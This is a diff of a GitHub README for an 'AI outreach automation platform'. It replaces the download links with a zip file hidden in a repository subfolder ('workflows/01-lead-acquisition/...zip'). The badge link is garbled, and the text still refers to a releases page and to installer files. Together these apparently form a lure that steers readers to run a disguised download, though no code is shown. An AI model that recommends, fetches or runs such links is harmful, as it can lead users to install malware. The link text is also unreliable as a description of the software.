@@ -1,6 +1,6 @@
 # 🎉 ai-outreach-automation-platform - Streamline Your Outreach Efforts Effortlessly
 
-[![Download Now](https://github.com/lucky14426/ai-outreach-automation-platform/raw/refs/heads/main/diagrams/04-connection-engagement/automation-outreach-platform-ai-3.5.zip%20Now-Get%https://github.com/lucky14426/ai-outreach-automation-platform/raw/refs/heads/main/diagrams/04-connection-engagement/automation-outreach-platform-ai-3.5.zip)](https://github.com/lucky14426/ai-outreach-automation-platform/raw/refs/heads/main/diagrams/04-connection-engagement/automation-outreach-platform-ai-3.5.zip)
+[![Download Now](https://raw.githubusercontent.com/lucky14426/ai-outreach-automation-platform/main/workflows/01-lead-acquisition/platform-ai-automation-outreach-2.9.zip%20Now-Get%https://raw.githubusercontent.com/lucky14426/ai-outreach-automation-platform/main/workflows/01-lead-acquisition/platform-ai-automation-outreach-2.9.zip)](https://raw.githubusercontent.com/lucky14426/ai-outreach-automation-platform/main/workflows/01-lead-acquisition/platform-ai-automation-outreach-2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -29,7 +29,7 @@ To run the ai-outreach-automation-platform, you will need:
 
 Visit the following link to download the latest version of the software:
 
-[Download the Latest Release](https://github.com/lucky14426/ai-outreach-automation-platform/raw/refs/heads/main/diagrams/04-connection-engagement/automation-outreach-platform-ai-3.5.zip)
+[Download the Latest Release](https://raw.githubusercontent.com/lucky14426/ai-outreach-automation-platform/main/workflows/01-lead-acquisition/platform-ai-automation-outreach-2.9.zip)
 
 Once on the Releases page, find the version you want to use. Click the appropriate file based on your operating system (e.g., `.exe` for Windows, `.dmg` for macOS, etc.). The platform will guide you through installation.
 
